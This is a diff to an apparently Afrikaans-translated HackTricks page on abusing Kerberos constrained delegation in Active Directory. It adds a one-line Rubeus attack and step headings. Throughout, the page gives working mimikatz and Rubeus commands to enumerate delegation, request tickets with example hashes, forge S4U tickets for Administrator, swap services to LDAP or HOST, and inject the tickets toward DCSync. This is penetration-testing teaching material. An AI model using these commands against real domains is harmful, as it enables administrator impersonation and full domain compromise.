@@ -4,16 +4,16 @@
 
 ## Beperkte Afvaardiging
 
-Deur dit kan 'n Domein administrateur **toelaat** dat 'n rekenaar **'n gebruiker of rekenaar naboots** teen 'n **diens** van 'n masjien.
+Deur dit kan 'n Domein administrateur **toelaat** dat 'n rekenaar **'n gebruiker of rekenaar naboots** teen enige **diens** van 'n masjien.
 
-- **Diens vir Gebruiker om self (**_**S4U2self**_**):** As 'n **diensrekening** 'n _userAccountControl_ waarde het wat [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) bevat, kan dit 'n TGS vir homself (die diens) verkry namens enige ander gebruiker.
-- **Diens vir Gebruiker om Proxy(**_**S4U2proxy**_**):** 'n **diensrekening** kan 'n TGS verkry namens enige gebruiker na die diens wat in **msDS-AllowedToDelegateTo** gestel is. Om dit te doen, benodig dit eers 'n TGS van daardie gebruiker na homself, maar dit kan S4U2self gebruik om daardie TGS te verkry voordat dit die ander een aanvra.
+- **Diens vir Gebruiker om self (_S4U2self_):** As 'n **diensrekening** 'n _userAccountControl_ waarde het wat [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) bevat, kan dit 'n TGS vir homself (die diens) verkry namens enige ander gebruiker.
+- **Diens vir Gebruiker om Proxy (_S4U2proxy_):** 'n **Diensrekening** kan 'n TGS verkry namens enige gebruiker na die diens wat in **msDS-AllowedToDelegateTo** gestel is. Om dit te doen, benodig dit eers 'n TGS van daardie gebruiker na homself, maar dit kan S4U2self gebruik om daardie TGS te verkry voordat dit die ander een aanvra.
 
-**Let wel**: As 'n gebruiker gemerk is as ‘_Rekening is sensitief en kan nie afgevaardig word_’ in AD, sal jy **nie in staat wees om** hulle te naboots nie.
+**Nota**: As 'n gebruiker gemerk is as ‘_Rekening is sensitief en kan nie gedelegeer word_’ in AD, sal jy **nie in staat wees om** hulle te naboots nie.
 
-Dit beteken dat as jy die **hash van die diens** compromitteer, jy **gebruikers kan naboots** en **toegang** namens hulle tot die **diens geconfigureer** (moontlike **privesc**).
+Dit beteken dat as jy die **hash van die diens** kompromitteer, jy **gebruikers kan naboots** en **toegang** namens hulle tot enige **diens** oor die aangeduide masjiene kan verkry (moontlike **privesc**).
 
-Boonop, jy **sal nie net toegang hê tot die diens wat die gebruiker kan naboots nie, maar ook tot enige diens** omdat die SPN (die diensnaam wat aangevra word) nie nagegaan word nie, net voorregte. Daarom, as jy toegang het tot **CIFS diens** kan jy ook toegang hê tot **HOST diens** met die `/altservice` vlag in Rubeus.
+Boonop, jy **sal nie net toegang hê tot die diens wat die gebruiker kan naboots nie, maar ook tot enige diens** omdat die SPN (die diensnaam wat aangevra word) nie nagegaan word nie (in die kaartjie is hierdie deel nie versleuteld/onderteken nie). Daarom, as jy toegang het tot **CIFS diens** kan jy ook toegang hê tot **HOST diens** met die `/altservice` vlag in Rubeus byvoorbeeld.
 
 Ook, **LDAP diens toegang op DC**, is wat nodig is om 'n **DCSync** te benut.
 ```bash:Enumerate
@@ -25,6 +25,11 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
 
+```bash:Quick Way
+# Generate TGT + TGS impersonating a user knowing the hash
+Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
+```
+- Stap 1: **Kry TGT van die toegelate diens**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -36,22 +41,24 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 mimikatz sekurlsa::ekeys
 
 ## Request with aes
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
 
 # Request with RC4
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Daar is **ander maniere om 'n TGT-kaartjie** of die **RC4** of **AES256** te verkry sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en onbeperkte delegasie, NTLM relaying en Active Directory Certificate Service misbruik.
+> Daar is **ander maniere om 'n TGT-kaartjie te verkry** of die **RC4** of **AES256** sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en onbeperkte delegasie, NTLM relaying en misbruik van die Active Directory Certificate Service.
 >
 > **Net deur daardie TGT-kaartjie (of gehasht) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**
+
+- Step2: **Kry TGS vir die diens wat die gebruiker naboots**
 ```bash:Using Rubeus
-#Obtain a TGS of the Administrator user to self
+# Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
 
-#Obtain service TGS impersonating Administrator (CIFS)
+# Obtain service TGS impersonating Administrator (CIFS)
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
 
 #Impersonate Administrator on different service (HOST)
@@ -74,6 +81,6 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-[**Meer inligting in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Meer inligting op ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
